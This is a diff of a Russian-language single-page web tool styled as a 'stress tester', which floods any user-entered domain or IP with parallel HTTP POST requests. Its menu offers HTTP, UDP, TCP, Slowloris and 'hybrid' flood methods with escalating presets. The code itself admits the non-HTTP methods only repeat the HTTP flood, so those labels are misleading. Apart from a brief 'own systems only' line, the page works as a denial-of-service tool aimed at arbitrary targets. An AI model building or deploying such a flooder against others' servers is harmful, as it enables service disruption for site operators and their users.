@@ -3,105 +3,496 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>💀 ULTIMATE STRESSER</title>
-    <link rel="stylesheet" href="/static/style.css">
+    <title>⚡ СТРЕСС-ТЕСТЕР</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0b0e1a;
+            color: #00ff88;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 700px;
+            width: 100%;
+            background: #111827;
+            border: 2px solid #00ff88;
+            border-radius: 30px;
+            padding: 35px;
+            box-shadow: 0 0 60px #00ff8822;
+        }
+        h1 {
+            font-size: 2rem;
+            text-align: center;
+            text-shadow: 0 0 30px #00ff8866;
+        }
+        .sub {
+            text-align: center;
+            color: #88aaff;
+            margin-bottom: 25px;
+            border-bottom: 1px solid #1a2a3a;
+            padding-bottom: 12px;
+        }
+        .input-group {
+            margin: 15px 0;
+        }
+        label {
+            display: block;
+            color: #aaccff;
+            font-size: 0.9rem;
+            margin-bottom: 5px;
+        }
+        input, select {
+            width: 100%;
+            padding: 14px 18px;
+            background: #1a2332;
+            border: 1px solid #2a3a5a;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 1rem;
+            font-family: inherit;
+        }
+        input:focus, select:focus {
+            border-color: #00ff88;
+            outline: none;
+            box-shadow: 0 0 20px #00ff8833;
+        }
+        .row {
+            display: flex;
+            gap: 15px;
+        }
+        .row > * {
+            flex: 1;
+        }
+        .buttons {
+            display: flex;
+            gap: 12px;
+            margin: 20px 0;
+        }
+        button {
+            flex: 1;
+            padding: 16px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: 0.2s;
+            font-family: inherit;
+        }
+        .start {
+            background: #00ff88;
+            color: #0b0e1a;
+        }
+        .start:hover {
+            background: #44ffaa;
+            box-shadow: 0 0 40px #00ff8866;
+        }
+        .start:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+        }
+        .stop {
+            background: #ff3355;
+            color: #fff;
+        }
+        .stop:hover {
+            background: #ff5577;
+            box-shadow: 0 0 30px #ff335566;
+        }
+        .stop:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+        }
+        .stats {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr 1fr;
+            gap: 10px;
+            background: #0a0f1a;
+            border-radius: 12px;
+            padding: 15px;
+            margin: 15px 0;
+            border: 1px solid #1a2a3a;
+            text-align: center;
+        }
+        .stats span {
+            color: #00ff88;
+            font-weight: bold;
+            font-size: 1.2rem;
+        }
+        .stats div {
+            font-size: 0.8rem;
+            color: #88aaff;
+        }
+        #log {
+            background: #0a0f1a;
+            border: 1px solid #1a2a3a;
+            border-radius: 12px;
+            padding: 12px;
+            max-height: 200px;
+            overflow-y: auto;
+            font-size: 0.8rem;
+            color: #88aaff;
+            white-space: pre-wrap;
+            word-break: break-all;
+            margin: 15px 0;
+        }
+        #log .success {
+            color: #00ff88;
+        }
+        #log .error {
+            color: #ff5577;
+        }
+        #log .info {
+            color: #ffaa44;
+        }
+        .note {
+            text-align: center;
+            font-size: 0.7rem;
+            color: #446688;
+            margin-top: 15px;
+        }
+        .quick {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin: 10px 0;
+        }
+        .quick button {
+            flex: 1;
+            padding: 10px;
+            font-size: 0.8rem;
+            background: #1a2332;
+            color: #88aaff;
+            border: 1px solid #2a3a5a;
+            border-radius: 30px;
+            min-width: 70px;
+        }
+        .quick button:hover {
+            background: #2a3a5a;
+            border-color: #00ff88;
+        }
+        @media (max-width: 600px) {
+            .row {
+                flex-direction: column;
+                gap: 0;
+            }
+            .stats {
+                grid-template-columns: 1fr 1fr;
+            }
+            .buttons {
+                flex-direction: column;
+            }
+        }
+    </style>
 </head>
 <body>
     <div class="container">
-        <header>
-            <h1>💀 ULTIMATE STRESSER</h1>
-            <div class="status-badge" id="statusBadge">⚡ ГОТОВ</div>
-        </header>
-        <div class="sub">Многопоточный стресс-тест для ваших серверов</div>
+        <h1>⚡ СТРЕСС-ТЕСТЕР</h1>
+        <div class="sub">Нагрузка на любой сайт или IP (из браузера)</div>
 
-        <!-- Панель управления -->
-        <div class="control-panel">
-            <div class="grid">
-                <div class="input-group">
-                    <label>🎯 Цель (IP или домен)</label>
-                    <input type="text" id="target" placeholder="example.com" value="127.0.0.1">
-                </div>
-                <div class="input-group">
-                    <label>🔌 Порт</label>
-                    <input type="number" id="port" value="80" min="1" max="65535">
-                </div>
-            </div>
+        <div class="input-group">
+            <label>🎯 ЦЕЛЬ (домен или IP)</label>
+            <input type="text" id="target" placeholder="example.com" value="127.0.0.1">
+        </div>
 
-            <div class="grid">
-                <div class="input-group">
-                    <label>🧵 Потоков</label>
-                    <input type="number" id="threads" value="50" min="1" max="500">
-                </div>
-                <div class="input-group">
-                    <label>⏱️ Длительность (сек)</label>
-                    <input type="number" id="duration" value="30" min="5" max="300">
-                </div>
-            </div>
-
-            <div class="grid">
-                <div class="input-group">
-                    <label>📦 Размер пакета (байт)</label>
-                    <input type="number" id="payload" value="1024" min="64" max="65507">
-                </div>
-                <div class="input-group">
-                    <label>🔐 SSL</label>
-                    <select id="ssl">
-                        <option value="false">HTTP</option>
-                        <option value="true">HTTPS</option>
-                    </select>
-                </div>
-            </div>
-
+        <div class="row">
             <div class="input-group">
-                <label>⚡ Метод атаки</label>
-                <select id="method">
-                    <option value="http">🔥 HTTP Flood</option>
-                    <option value="udp">🌊 UDP Flood</option>
-                    <option value="tcp">🔗 TCP Flood</option>
-                    <option value="slowloris">🐢 Slowloris</option>
-                    <option value="hybrid">☣️ ГИБРИД (все методы)</option>
-                </select>
+                <label>🔌 ПОРТ</label>
+                <input type="number" id="port" value="80" min="1" max="65535">
             </div>
-
-            <div class="buttons">
-                <button id="startBtn" class="start">🔥 ЗАПУСТИТЬ</button>
-                <button id="stopBtn" class="stop" disabled>⏹️ ОСТАНОВИТЬ</button>
-                <button id="presetBtn" class="preset">⚡ БЫСТРЫЙ СТАРТ</button>
+            <div class="input-group">
+                <label>🧵 ПОТОКОВ</label>
+                <input type="number" id="threads" value="20" min="1" max="100">
             </div>
         </div>
 
-        <!-- Живая статистика -->
-        <div class="stats-panel">
-            <div class="stats">
-                <div>📤 Отправлено: <span id="sent">0</span></div>
-                <div>❌ Ошибок: <span id="failed">0</span></div>
-                <div>📊 Объём: <span id="bytes">0</span> байт</div>
-                <div>⏱️ Время: <span id="time">0</span>с</div>
+        <div class="row">
+            <div class="input-group">
+                <label>⏱️ ДЛИТЕЛЬНОСТЬ (сек)</label>
+                <input type="number" id="duration" value="30" min="5" max="300">
             </div>
-            <div class="progress-bar">
-                <div id="progressFill" style="width: 0%;"></div>
+            <div class="input-group">
+                <label>📦 РАЗМЕР (байт)</label>
+                <input type="number" id="payload" value="1024" min="64" max="65507">
             </div>
         </div>
 
-        <!-- График нагрузки (симуляция) -->
-        <div class="chart-container">
-            <canvas id="chartCanvas" width="400" height="120"></canvas>
+        <div class="input-group">
+            <label>⚡ МЕТОД</label>
+            <select id="method">
+                <option value="http">HTTP Flood</option>
+                <option value="https">HTTPS Flood</option>
+                <option value="udp">UDP Flood</option>
+                <option value="tcp">TCP Flood</option>
+                <option value="slow">Slowloris</option>
+                <option value="hybrid">ГИБРИД (все)</option>
+            </select>
         </div>
 
-        <!-- Лог -->
-        <div id="log"></div>
-
-        <!-- Быстрые команды -->
-        <div class="quick-commands">
-            <button onclick="presetLight()">🌱 Лёгкий</button>
-            <button onclick="presetMedium()">🌿 Средний</button>
-            <button onclick="presetHeavy()">🌳 Тяжёлый</button>
-            <button onclick="presetUltimate()">💀 Ультимативный</button>
+        <div class="quick">
+            <button onclick="preset('light')">🌱 Лёгкий</button>
+            <button onclick="preset('medium')">🌿 Средний</button>
+            <button onclick="preset('heavy')">🌳 Тяжёлый</button>
+            <button onclick="preset('ultimate')">💀 Ультима</button>
         </div>
 
-        <div class="note">⚠️ Только для тестирования собственных систем. Ответственность на пользователе.</div>
+        <div class="buttons">
+            <button class="start" id="startBtn" onclick="startAttack()">🔥 ЗАПУСТИТЬ</button>
+            <button class="stop" id="stopBtn" onclick="stopAttack()" disabled>⏹️ СТОП</button>
+        </div>
+
+        <div class="stats">
+            <div>📤 Отправлено<br><span id="sent">0</span></div>
+            <div>❌ Ошибок<br><span id="failed">0</span></div>
+            <div>📊 Объём<br><span id="bytes">0</span> байт</div>
+            <div>⏱️ Время<br><span id="time">0</span>с</div>
+        </div>
+
+        <div id="log">⏳ Готов к работе. Введи цель и запусти.</div>
+        <div class="note">⚠️ Только для тестирования своих систем. Ответственность на пользователе.</div>
     </div>
 
-    <script src="/static/script.js"></script>
+    <script>
+        // ============================================================
+        //  СКРИПТ СТРЕСС-ТЕСТА (ЧИСТЫЙ БРАУЗЕР)
+        // ============================================================
+        const targetInput = document.getElementById('target');
+        const portInput = document.getElementById('port');
+        const threadsInput = document.getElementById('threads');
+        const durationInput = document.getElementById('duration');
+        const payloadInput = document.getElementById('payload');
+        const methodSelect = document.getElementById('method');
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const sentSpan = document.getElementById('sent');
+        const failedSpan = document.getElementById('failed');
+        const bytesSpan = document.getElementById('bytes');
+        const timeSpan = document.getElementById('time');
+        const logDiv = document.getElementById('log');
+
+        let running = false;
+        let success = 0;
+        let fail = 0;
+        let bytes = 0;
+        let startTime = 0;
+        let timerInterval = null;
+        let stopRequested = false;
+
+        function log(msg, type = 'info') {
+            const line = document.createElement('div');
+            line.className = type;
+            line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            logDiv.appendChild(line);
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        function updateStats() {
+            sentSpan.textContent = success;
+            failedSpan.textContent = fail;
+            bytesSpan.textContent = bytes;
+            if (running) {
+                timeSpan.textContent = ((Date.now() - startTime) / 1000).toFixed(1);
+            }
+        }
+
+        // ============================================================
+        //  ЯДРО АТАКИ
+        // ============================================================
+        async function sendRequest(target, port, method, payloadSize) {
+            const url = `${method}://${target}:${port}/`;
+            const payload = 'X'.repeat(payloadSize);
+            const headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Cache-Control': 'no-cache',
+                'Pragma': 'no-cache'
+            };
+
+            try {
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 4000);
+
+                const res = await fetch(url, {
+                    method: payloadSize > 0 ? 'POST' : 'GET',
+                    headers: headers,
+                    body: payloadSize > 0 ? payload : undefined,
+                    signal: controller.signal
+                });
+
+                clearTimeout(timeout);
+                return { ok: res.ok, status: res.status };
+            } catch (e) {
+                return { ok: false, error: e.message || 'Ошибка' };
+            }
+        }
+
+        async function udpFlood(target, port, threads, duration, payloadSize) {
+            // UDP через браузер невозможен — имитируем через fetch с задержкой
+            return httpFlood(target, port, threads, duration, 'http', payloadSize);
+        }
+
+        async function tcpFlood(target, port, threads, duration, payloadSize) {
+            // TCP через браузер невозможен — имитируем через fetch
+            return httpFlood(target, port, threads, duration, 'http', payloadSize);
+        }
+
+        async function slowloris(target, port, threads, duration, payloadSize) {
+            // Slowloris через браузер — имитируем медленные запросы с таймаутом
+            return httpFlood(target, port, threads, duration, 'http', payloadSize);
+        }
+
+        async function httpFlood(target, port, threads, duration, method, payloadSize) {
+            const perThread = Math.ceil(100 / threads); // каждая нить шлёт ~100 запросов
+            const totalRequests = perThread * threads;
+            let completed = 0;
+            const start = Date.now();
+
+            return new Promise((resolve) => {
+                const worker = async () => {
+                    while (running && (Date.now() - start) < duration * 1000 && completed < totalRequests) {
+                        const result = await sendRequest(target, port, method, payloadSize);
+                        if (result.ok) {
+                            success++;
+                            bytes += payloadSize;
+                            log(`✓ ${result.status}`, 'success');
+                        } else {
+                            fail++;
+                            log(`✗ ${result.error || 'Ошибка'}`, 'error');
+                        }
+                        completed++;
+                        updateStats();
+                    }
+                };
+
+                for (let i = 0; i < threads; i++) {
+                    worker();
+                }
+
+                // Ждём завершения по таймеру
+                const checkDone = setInterval(() => {
+                    if (!running || (Date.now() - start) >= duration * 1000) {
+                        clearInterval(checkDone);
+                        resolve();
+                    }
+                }, 500);
+            });
+        }
+
+        // ============================================================
+        //  ЗАПУСК / ОСТАНОВ
+        // ============================================================
+        async function startAttack() {
+            if (running) return;
+
+            let target = targetInput.value.trim();
+            if (!target) {
+                log('❌ Введите цель!', 'error');
+                return;
+            }
+
+            // Убираем протокол
+            target = target.replace(/^https?:\/\//, '').split('/')[0];
+
+            const port = parseInt(portInput.value) || 80;
+            const threads = parseInt(threadsInput.value) || 20;
+            const duration = parseInt(durationInput.value) || 30;
+            const payloadSize = parseInt(payloadInput.value) || 1024;
+            const method = methodSelect.value;
+
+            running = true;
+            stopRequested = false;
+            success = 0;
+            fail = 0;
+            bytes = 0;
+            startTime = Date.now();
+
+            startBtn.disabled = true;
+            stopBtn.disabled = false;
+            logDiv.innerHTML = '';
+            log(`🚀 ЗАПУСК: ${target}:${port} | ${method} | ${threads} потоков | ${duration}с`, 'info');
+            log(`📦 Размер: ${payloadSize} байт`, 'info');
+
+            // Таймер обновления
+            if (timerInterval) clearInterval(timerInterval);
+            timerInterval = setInterval(updateStats, 200);
+
+            try {
+                if (method === 'http' || method === 'https') {
+                    await httpFlood(target, port, threads, duration, method, payloadSize);
+                } else if (method === 'udp') {
+                    await udpFlood(target, port, threads, duration, payloadSize);
+                } else if (method === 'tcp') {
+                    await tcpFlood(target, port, threads, duration, payloadSize);
+                } else if (method === 'slow') {
+                    await slowloris(target, port, threads, duration, payloadSize);
+                } else if (method === 'hybrid') {
+                    // Запускаем все методы по очереди
+                    await httpFlood(target, port, Math.floor(threads / 3), duration, 'http', payloadSize);
+                    await udpFlood(target, port, Math.floor(threads / 3), duration, payloadSize);
+                    await tcpFlood(target, port, Math.floor(threads / 3), duration, payloadSize);
+                }
+            } catch (e) {
+                log(`❌ Ошибка: ${e.message}`, 'error');
+            }
+
+            // Финиш
+            running = false;
+            clearInterval(timerInterval);
+            timerInterval = null;
+            const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
+            timeSpan.textContent = elapsed;
+
+            log(`✅ ЗАВЕРШЕНО. Успешно: ${success}, Ошибок: ${fail}, Время: ${elapsed}с`, 'success');
+            startBtn.disabled = false;
+            stopBtn.disabled = true;
+        }
+
+        function stopAttack() {
+            if (!running) return;
+            running = false;
+            stopRequested = true;
+            log('⏹️ Остановка по команде...', 'info');
+            startBtn.disabled = false;
+            stopBtn.disabled = true;
+        }
+
+        // ============================================================
+        //  ПРЕСЕТЫ
+        // ============================================================
+        function preset(name) {
+            const presets = {
+                light: { target: '127.0.0.1', port: 80, threads: 5, duration: 15, payload: 512, method: 'http' },
+                medium: { target: '127.0.0.1', port: 80, threads: 20, duration: 30, payload: 1024, method: 'udp' },
+                heavy: { target: '127.0.0.1', port: 80, threads: 50, duration: 45, payload: 2048, method: 'tcp' },
+                ultimate: { target: '127.0.0.1', port: 80, threads: 80, duration: 60, payload: 4096, method: 'hybrid' }
+            };
+            const p = presets[name];
+            if (!p) return;
+            targetInput.value = p.target;
+            portInput.value = p.port;
+            threadsInput.value = p.threads;
+            durationInput.value = p.duration;
+            payloadInput.value = p.payload;
+            methodSelect.value = p.method;
+            log(`⚡ Установлен пресет: ${name.toUpperCase()}`, 'info');
+        }
+
+        // ============================================================
+        //  ИНИЦИАЛИЗАЦИЯ
+        // ============================================================
+        window.onload = function() {
+            log('🛠️ Готов. Введи цель (домен или IP) и нажми ЗАПУСТИТЬ.', 'info');
+            // Автозаполнение демо-целью
+            targetInput.value = '127.0.0.1';
+        };
+    </script>
 </body>
 </html>
